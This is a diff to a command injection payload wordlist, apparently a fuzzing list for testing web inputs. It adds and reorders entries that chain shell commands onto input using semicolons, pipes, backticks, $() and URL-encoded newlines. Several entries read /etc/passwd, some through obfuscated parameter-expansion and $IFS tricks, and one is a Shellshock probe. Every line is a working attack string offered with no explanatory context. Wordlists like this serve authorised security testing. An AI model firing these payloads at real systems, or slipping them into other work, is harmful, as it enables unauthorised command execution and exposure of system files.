@@ -6,18 +6,34 @@
 ;id
 ;netstat -a;
 ;system('cat%20/etc/passwd')
+; ls
+;id|
+;|/usr/bin/id|
+;/usr/bin/id\n
+;id\n
+;system('id')
+;system('/usr/bin/id')
+; id
+id;
+id
+netstat -a;
+system('cat%20/etc/passwd')
+ls
+id|
+|/usr/bin/id|
+/usr/bin/id\n
+id\n
+system('id')
+system('/usr/bin/id')
 |id
 |/usr/bin/id
 |id|
-|/usr/bin/id|
 ||/usr/bin/id|
 |id;
 ||/usr/bin/id;
-; ls
 && ls
 | ls
 || ls
-;id|
 cat</etc/passwd
 {cat,/etc/passwd}
 cat$IFS/etc/passwd
@@ -52,16 +68,14 @@ cat ${test//hh??hm/}
 g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 `cat /etc/passwd`
 $(cat /etc/passwd)
-;|/usr/bin/id|
 \n/bin/ls -al\n
 \n/usr/bin/id\n
 \nid\n
 \n/usr/bin/id;
+;/usr/bin/id;
 \nid;
 \n/usr/bin/id|
 \nid|
-;/usr/bin/id\n
-;id\n
 |usr/bin/id\n
 |nid\n
 `id`
@@ -85,8 +99,6 @@ a;/usr/bin/id|
 a)|/usr/bin/id
 a|/usr/bin/id
 a)|/usr/bin/id;
-;system('id')
-;system('/usr/bin/id')
 %0A/usr/bin/id
 %0Aid
 %0A/usr/bin/id%0A
@@ -97,7 +109,6 @@ a)|/usr/bin/id;
 `ping 127.0.0.1`
 | id
 & id
-; id
 %0a id %0a
 $;/usr/bin/id
 () { :;}; /bin/bash -c "whoami && echo vulnerable"
